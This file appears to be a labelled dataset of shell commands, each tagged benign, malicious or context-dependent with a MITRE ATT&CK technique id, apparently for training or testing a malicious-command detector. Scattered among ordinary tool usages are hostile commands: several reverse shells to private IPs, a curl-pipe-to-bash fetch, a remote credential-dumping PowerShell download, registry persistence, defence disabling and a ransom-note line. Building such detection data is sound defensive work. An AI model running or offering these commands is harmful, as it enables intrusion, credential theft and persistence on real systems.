command,label,original_label,mitre_id
ilbmtoppm [-m|-maskfile] path/to/maskfile.pbm path/to/file.ilbm > path/to/file.ppm,Benign,Benign,Benign
phpstan analyse --help,Benign,Benign,Benign
yum install -y nodejs,Benign,Benign,Benign
"ptargrep [-i|--ignore-case] ""search_pattern"" path/to/file",Benign,Benign,Benign
rdfind -dryrun true path/to/directory,Benign,Benign,Benign
find . -type f -name '*.c' -exec cat {} \; | sed '/^\s*#/d;/^\s*$/d;/^\s*\/\//d' | wc -l,Benign,Benign,Benign
systemctl list-units --type=service,Context_Dependent,Synthetic,Synthetic
"find /home/exampleuser/ -name ""*conf"" -mtime 3",Context_Dependent,Benign,Benign
swipl,Benign,Benign,Benign
gt modify -cam commit_message,Benign,Benign,Benign
windbg.exe -g {CMD},Malicious,Malicious,T1127
"$sheet.Cells.Item(10,1) = ""=FWRITELN(A5, `""winHttp.Send`"")""",Malicious,Malicious,T1204
"find . -maxdepth 1 -type f ! -name '*.gz' -exec gzip ""{}"" \;",Benign,Benign,Benign
mediainfo --Logfile=out.txt file,Benign,Benign,Benign
sudo arpspoof -i wlan0 -t target_ip host_ip,Benign,Benign,Benign
linode-cli object-storage keys create --label label,Benign,Benign,Benign
New-MailboxExportRequest,Malicious,Malicious,T1114
scala-cli fmt path/to/script.scala,Benign,Benign,Benign
"su -c ""cd /tmp; curl -s $remote_url | bash"" art",Malicious,Malicious,T1110
lsusb,Benign,Benign,Benign
nxc ftp 192.168.178.2 [-u|--username] path/to/usernames.txt [-p|--password] path/to/passwords.txt --continue-on-success,Benign,Benign,Benign
pyinfra path/to/target_list.py path/to/deploy.py,Benign,Benign,Benign
head -20 /etc/os-release,Context_Dependent,Synthetic,Synthetic
sleep 500,Benign,Benign,Benign
speedtest-cli,Benign,Benign,Benign
ftxdiff --output path/to/fontdiff_file.txt path/to/font_file1.ttc path/to/font_file2.ttc,Benign,Benign,Benign
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs"" /ve /T REG_SZ /d ""{00000001-0000-0000-0000-0000FEEDACDC}"" /f",Malicious,Malicious,T1546
getmac /fo table|list|csv,Benign,Benign,Benign
aws s3 sync s3://bucket_name path/to/target,Benign,Benign,Benign
readlink -f $(which java),Benign,Benign,Benign
dvc [-h|--help],Benign,Benign,Benign
"if [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo ""/etc/init.d not present on this system""; fi",Context_Dependent,Malicious,T1007
sudo virt-sysprep [-a|--add] path/to/image.qcow2,Benign,Benign,Benign
bzip3 [-t|--test] path/to/compressed_file.bz3,Benign,Benign,Benign
promtool check rules rules_file.yml,Benign,Benign,Benign
file $(which perl 2>/dev/null),Context_Dependent,Synthetic,Synthetic
prstat,Benign,Benign,Benign
ls -lR / | tee output.file,Benign,Benign,Benign
genie [-s|--shell],Benign,Benign,Benign
gh release [ls|list],Benign,Benign,Benign
tts --model_info_by_idx model_type/model_query_idx,Benign,Benign,Benign
ppmtopjxl [-xsi|-xsize] 10cm [-ysi|-ysize] 5cm path/to/image.ppm > path/to/output.pjxl,Benign,Benign,Benign
tuir,Benign,Benign,Benign
"find kat -type f \( -name ""*.c"" -o -name ""*.cpp"" -o -name ""*.h"" \)",Benign,Benign,Benign
sc query windefend,Context_Dependent,Malicious,T1518
"find ""$ORIG_DIR"" -name ""*"" -type f",Benign,Benign,Benign
pkcon install package,Benign,Benign,Benign
boxxy scan,Benign,Benign,Benign
join -v1 <(sort file1) <(sort file2),Benign,Benign,Benign
git magic -p,Benign,Benign,Benign
"sed '/start/,+4d'",Benign,Benign,Benign
sstat [-j|--jobs] job_id,Benign,Benign,Benign
braa public@ip_address:.1.3.6.*,Benign,Benign,Benign
echo 'ls -hal /root/ > /root/test.out' | sudo bash,Benign,Benign,Benign
$(dirname $(readlink -e ../../../../etc/passwd)),Benign,Benign,Benign
"ping -c1 1199092913 | head -n1 | grep -Eow ""[0-9]+[.][0-9]+[.][0-9]+[.][0-9]+""",Benign,Benign,Benign
pio lib search keyword,Benign,Benign,Benign
"printf ""a\0b"" | od -tx1",Benign,Benign,Benign
pulumi whoami [-v|--verbose],Benign,Benign,Benign
ufile.io,Malicious,Malicious,T1570
ffsend upload path/to/file [-p|--password] password,Benign,Benign,Benign
pamfix [-cl|-clip] path/to/corrupted.ext > path/to/output.ext,Benign,Benign,Benign
json5 [-h|--help],Benign,Benign,Benign
portablectl is-attached path/to/image|image_name,Benign,Benign,Benign
updatectl check,Benign,Benign,Benign
conntrack [-E|--event] [-o|--output] timestamp,Benign,Benign,Benign
rename [-f|--force] 's/\b(\w)/\U$1/g' *.txt,Benign,Benign,Benign
lt [-p|--port] 8000,Benign,Benign,Benign
nbtscan 192.168.0.1,Context_Dependent,Benign,Benign
sudo zoneadm -z zone_name uninstall,Benign,Benign,Benign
lsfd [-h|--help],Benign,Benign,Benign
gcpdiag lint --project gcp_project_id,Benign,Benign,Benign
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,Malicious,Synthetic,Synthetic
systemd-detect-virt [-c|--container],Benign,Benign,Benign
dir \\$computer_ip\admin$,Context_Dependent,Malicious,T1135
"gallery-dl --destination path/to/directory ""url""",Benign,Benign,Benign
"alias lvim=""vim -c \""normal '0\""""",Benign,Benign,Benign
grep -i error /var/log/boot.log,Context_Dependent,Synthetic,Synthetic
git ls-crypt,Benign,Benign,Benign
checkupdates [-n|--nosync],Benign,Benign,Benign
Disable-AntiPhishRule -Identity $test.Name -Confirm:$false,Malicious,Malicious,T1562
"find . -name ""*.txt"" | xargs rm",Benign,Benign,Benign
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},Malicious,Malicious,T1216
debchange [-n|--nmu],Benign,Benign,Benign
networksetup -setsecurewebproxy $interface $proxy_server $proxy_port,Malicious,Malicious,T1090
find $path -type d,Benign,Benign,Benign
dvc fetch [-r|--remote] remote_name,Benign,Benign,Benign
just recipe,Benign,Benign,Benign
systemctl freeze unit1 unit2 ...,Benign,Benign,Benign
kool run script,Benign,Benign,Benign
trayer,Benign,Benign,Benign
"cbt count ""table_name""",Benign,Benign,Benign
New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription,Malicious,Malicious,T1098
nagios4 -s,Benign,Benign,Benign
"func_name() { echo ""Function contents here""; }",Benign,Benign,Benign
po4a-updatepo --format text --master path/to/master.txt --po path/to/po1.po --po path/to/po2.po,Benign,Benign,Benign
ruff format --diff,Benign,Benign,Benign
sn -e path/to/assembly.dll path/to/output.pub,Benign,Benign,Benign
shopt nullglob,Benign,Benign,Benign
talosctl bootstrap [-n|--nodes] node_ip,Benign,Benign,Benign
diskonaut --disable-delete-confirmation,Benign,Benign,Benign
"sh -c ""echo 'echo Hello from the Atomic Red Team' > $script_path""",Malicious,Malicious,T1059
systemctl stop cbdaemon,Malicious,Malicious,T1562
rabbitmqctl clear_permissions [-p|--vhost] vhost_name username,Benign,Benign,Benign
s3cmd get s3://bucket_name/path/to/file path/to/local_file,Benign,Benign,Benign
cat ${SPOOL_FILE} | tee -a ${LOG_FILE},Benign,Benign,Benign
pridecat path/to/file [--trans|--transgender],Benign,Benign,Benign
wg genkey | tee path/to/private_key | wg pubkey > path/to/public_key,Benign,Benign,Benign
pyflakes iterSourceCode path/to/directory_1 path/to/directory_2 ...,Benign,Benign,Benign
"i3-nagbar [-pm|--primary --message] ""error message""",Benign,Benign,Benign
"echo ""import subprocess; subprocess.Popen(['open', '-a', '$exe_name'])"" > ""$SITE_PACKAGES/atomic_hook.pth""",Malicious,Malicious,T1546
mkdir -p tmp/real_dir1 tmp/real_dir2,Benign,Benign,Benign
"grep -r ""string to be searched"" /path/to/dir",Benign,Benign,Benign
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit,Malicious,Malicious,T1060
moro report,Benign,Benign,Benign
"find . -perm /u=w,g=w",Benign,Benign,Benign
bsub -W 45 path/to/script.sh,Benign,Benign,Benign
net time \\$computer_name,Malicious,Malicious,T1124
CreateToolhelp32Snapshot,Context_Dependent,Malicious,T1057
ntfs-read.py -extract \windows\system32\config\sam volume,Benign,Benign,Benign
rustup doc,Benign,Benign,Benign
sudo systemd-firstboot --force,Benign,Benign,Benign
find data/ -name filepattern-*2009* -print > filesOfInterest.txt,Benign,Benign,Benign
xml [el|elements] -u path/to/input.xml|URI,Benign,Benign,Benign
tt -showwpm -notheme,Benign,Benign,Benign
ip ssh version 2,Benign,Benign,Benign
find /usr/share/doc -name README,Benign,Benign,Benign
"read -e -p ""Enter the path to the file: "" -i ""/usr/local/etc/"" FILEPATH",Benign,Benign,Benign
HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf,Malicious,Malicious,T1137
resize2fs -M /dev/sdXN,Benign,Benign,Benign
needrestart --help,Benign,Benign,Benign
copr-cli whoami,Benign,Benign,Benign
"crontab -u user -l | sed ""$my_wonderful_sed_script"" | crontab -u user -",Benign,Benign,Benign
nmtui connect,Benign,Benign,Benign
echo 'scale = 10; 5 / 3' | bc,Benign,Benign,Benign
http https://example.com,Benign,Benign,Benign
"ln -s ""$(which bam2)"" ""$tmpdir""/bam",Benign,Benign,Benign
nxc ssh 192.168.178.0/24 [-u|--username] username [-p|--password] password,Benign,Benign,Benign
qtile top --force,Benign,Benign,Benign
gcrane completion zsh > $(brew --prefix)/share/zsh/site-functions/_gcrane,Benign,Benign,Benign
beet stats,Benign,Benign,Benign
SeImpersonate,Malicious,Malicious,T1134
cmd /c tasklist,Context_Dependent,Malicious,T1057
minifab down,Benign,Benign,Benign
"Start-Service -Name ""$service_name""",Malicious,Malicious,T1543
distccd --daemon [-a|--allow] ip_address|network_prefix,Benign,Benign,Benign
dark-mode on,Benign,Benign,Benign
join -j2 <(sort -k2 file1) <(sort -k2 file2),Benign,Benign,Benign
osascript path/to/apple.scpt,Benign,Benign,Benign
find /usr/share/doc -iname readme\*,Benign,Benign,Benign
"dig @$ns $d A | grep $d | grep -v ""DiG""",Benign,Benign,Benign
airpaste,Benign,Benign,Benign
"systemd-ask-password ""prompt""",Benign,Benign,Benign
wlsunset -l latitude -L longitude,Benign,Benign,Benign
logoff session_name|session_id,Benign,Benign,Benign
mplayer -loop 0 path/to/file,Benign,Benign,Benign
systemctl whoami pid,Benign,Benign,Benign
grub-bios-setup [-d|--directory] /boot/grub /dev/sdX,Benign,Benign,Benign
live-server,Benign,Benign,Benign
aider --help,Benign,Benign,Benign
loadkeys [-b|--bkeymap] en|de|fi|...,Benign,Benign,Benign
slurmctld -h,Benign,Benign,Benign
"echo ""5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us"" >> $env:Userprofile\Desktop\akira_readme.txt",Malicious,Malicious,T1486
"python3 -c ""import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.5',8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])""",Malicious,Synthetic,Synthetic
pop,Benign,Benign,Benign
sudo umount [-a|--all],Benign,Benign,Benign
git cliff [-i|--init],Benign,Benign,Benign
gs -dQUIET -dBATCH -dNOPAUSE -sDEVICE=pdfwrite -sOutputFile=output.pdf input.pdf,Benign,Benign,Benign
seq 1 10 | perl -ne 'print if ( !eof )' | perl -ne 'print if ( !eof )' | perl -ne 'print if ( !eof )',Benign,Benign,Benign
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force,Malicious,Malicious,T1555
Register-cimprovider -path {PATH_ABSOLUTE:.dll},Malicious,Malicious,T1218
locate,Context_Dependent,Malicious,T1083
chezmoi init repository_url,Benign,Benign,Benign
"find /user/directory/ -name ""*txt"" -mtime 0 -type f -printf '%p: ' -exec tail -1 {} \;",Benign,Benign,Benign
"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"")'",Malicious,Synthetic,Synthetic
dpkg [-L|--listfiles] package,Benign,Benign,Benign
apptainer run-help --app app_name path/to/image.sif,Benign,Benign,Benign
"sops -d --extract '[""an_array""][1]' path/to/file.enc.json",Benign,Benign,Benign
pacini path/to/file --section section_name,Benign,Benign,Benign
"strace -f -e trace=open,read,write -p 1234",Context_Dependent,Synthetic,Synthetic
sbctl verify,Benign,Benign,Benign
dub init project_name [-n|--non-interactive],Benign,Benign,Benign
mssqlclient.py -k domain/username@target,Benign,Benign,Benign
xmake [b|build] [r|run],Benign,Benign,Benign
deb-get remove package,Benign,Benign,Benign
mysqlcheck --repair table,Benign,Benign,Benign
head [-c|--bytes] -count path/to/file,Benign,Benign,Benign
"top -p $(pgrep -d',' http)",Benign,Benign,Benign
neomutt -a path/to/file1 path/to/file2 ... -- recipient@example.com,Benign,Benign,Benign
tree path\to\directory /a,Benign,Benign,Benign
"find . -path ""./dirtoexclude"" -prune \ -o -exec java -jar config/yuicompressor-2.4.2.jar --type js '{}' -o '{}' \;",Benign,Benign,Benign
tldr linode-cli volumes,Benign,Benign,Benign
nmap --script=/path/to/temp-file,Malicious,Malicious,T1548
"copy ""$service_executable"" ""C:\Program Files\windows_service.exe""",Malicious,Malicious,T1574
"find . -name ""*.txt"" -prune -o -print",Benign,Benign,Benign
du -hs /path/to/directory,Benign,Benign,Benign
jira issue create [-P|--parent] parent,Benign,Benign,Benign
chown $1:httpd .htaccess,Benign,Benign,Benign
find /home -type d ! -exec test -e '{}/bin' \; -print,Context_Dependent,Benign,Benign
bk use organization_slug,Benign,Benign,Benign
sudo steamos-finalize-install --force,Benign,Benign,Benign
pg_archivecleanup [-d|--debug] path/to/archive path/to/walfile,Benign,Benign,Benign
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,Malicious,Malicious,T1548
virt-what > path/to/file,Benign,Benign,Benign
"make [-j|--jobs] parallel_jobs CC=""distcc gcc""",Benign,Benign,Benign
virsh pool-destroy --pool name|uuid,Benign,Benign,Benign
meteor add package,Benign,Benign,Benign
dc [-e|--expression] '7 k 5 _3 / p',Benign,Benign,Benign
Get-DedupProperties -FileSystemLabel 'Label',Benign,Benign,Benign
"echo ""luke;yoda;leila"" | tr "";"" ""\n""",Benign,Benign,Benign
aws cognito-idp delete-user-pool --user-pool-id user_pool_id,Benign,Benign,Benign
join -1 3 -2 1 path/to/file1 path/to/file2,Benign,Benign,Benign
find ~/Library -name '* *',Benign,Benign,Benign
img2txt [-y|--font-height] 14 path/to/image,Benign,Benign,Benign
df -hT,Context_Dependent,Synthetic,Synthetic
shift `expr $# - 1`,Benign,Benign,Benign
jj duplicate,Benign,Benign,Benign
v4l2-ctl --list-formats-ext,Benign,Benign,Benign
dsenableroot -u art-tester -p art-tester -r art-root #new user,Malicious,Malicious,T1078
sudo lvconvert --type thin-pool --poolmetadata /dev/vg_name/pool_metadata_lv /dev/vg_name/pool_lv,Benign,Benign,Benign
"alpaca --ask ""message""",Benign,Benign,Benign
"$VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002",Malicious,Malicious,T1566
find ./ -regex '.*\..*',Benign,Benign,Benign
ls -ltr | grep 'Mar 4' | awk '{print 9}' | xargs zcat -fq | grep 12345,Benign,Benign,Benign
path/to/ShooterGameServer TheIsland,Benign,Benign,Benign
sudo apache2ctl stop,Benign,Benign,Benign
propelauth set-default-project,Benign,Benign,Benign
"typst init ""template"" path/to/directory",Benign,Benign,Benign
fdp -T png -O path/to/input.gv,Benign,Benign,Benign
openssl < /dev/null s_client -connect host:443 -showcerts,Benign,Benign,Benign
C:\ProgramData\,Malicious,Malicious,T1036
dog example.com MX @1.1.1.1,Benign,Benign,Benign
find . -type d -name 'test' -exec rm -rf {} \;,Benign,Benign,Benign
tldr dnf repoquery,Benign,Benign,Benign
ssh -L 5432:localhost:5432 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
find /full/path/dir -name '*.txt' -print0 | xargs -0 rm,Benign,Benign,Benign
"find /home/jassi/ -type f -name ""aliencoders.[0-9]+""",Context_Dependent,Benign,Benign
lstopo-no-graphics [-h|--help],Benign,Benign,Benign
"type C:\temp\evil.exe > ""C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe""",Malicious,Malicious,T1564
cmctl create certificaterequest my-cr --from-certificate-file cert.yaml --fetch-certificate --timeout 20m,Benign,Benign,Benign
"find / -name ""[a-j]*"" -print",Context_Dependent,Benign,Benign
localectl list-keymaps,Benign,Benign,Benign
ghdl -e design,Benign,Benign,Benign
bunx package_name --version,Benign,Benign,Benign
play path/to/audio_file speed 2.0,Benign,Benign,Benign
for FILENAME in *; do mv $FILENAME Unix_$FILENAME; done,Benign,Benign,Benign
pulumi plugin [-h|--help],Benign,Benign,Benign
cheatshh [-ec|--edit-command],Benign,Benign,Benign
tag [-r|--remove] \* path/to/file,Benign,Benign,Benign
git symbolic-ref [-d|--delete] refs/name,Benign,Benign,Benign
gem install gem_name [-v|--version] 1.0.0,Benign,Benign,Benign
systemctl status kubelet,Context_Dependent,Synthetic,Synthetic
"find /path/to/directory/* -maxdepth 0 -type d -printf ""%P\n"" -exec sudo tar -zcpvf {}.tar.gz {} \;",Benign,Benign,Benign
fsck -q /dev/sdX,Benign,Benign,Benign
rpcclient $> createdomuser username,Benign,Benign,Benign
aur sync --noview [-n|--noconfirm] package,Benign,Benign,Benign
find /var/www/html/zip/data -type d -mtime +90 | uniq,Benign,Benign,Benign
swupd check-update,Benign,Benign,Benign
nix eval nixpkgs#pkg --apply 'lambda_function',Benign,Benign,Benign
duplicacy list,Benign,Benign,Benign
chkrootkit -r path/to/directory,Benign,Benign,Benign
tio --output-mode hex /dev/ttyUSB0,Benign,Benign,Benign
chronic -v command option1 option2 ...,Benign,Benign,Benign
mp4box -info path/to/file,Benign,Benign,Benign
lshw,Malicious,Malicious,T1680
find /etc/ -user root -mtime 1,Benign,Benign,Benign
you-get [-x|--http-proxy] proxy_server https://example.com/watch?v=value,Benign,Benign,Benign
yay package_name|search_term,Benign,Benign,Benign
zsh path/to/script.zsh,Benign,Benign,Benign
gh ssh-key add [-t|--title] title path/to/key.pub,Benign,Benign,Benign
envycontrol [-h|--help],Benign,Benign,Benign
lsblk [-a|--all],Benign,Benign,Benign
golangci-lint run,Benign,Benign,Benign
mongorestore --host database_host:port --db database_name --username username path/to/file --password,Benign,Benign,Benign
podman build [-f|--file] Containerfile.different .,Benign,Benign,Benign
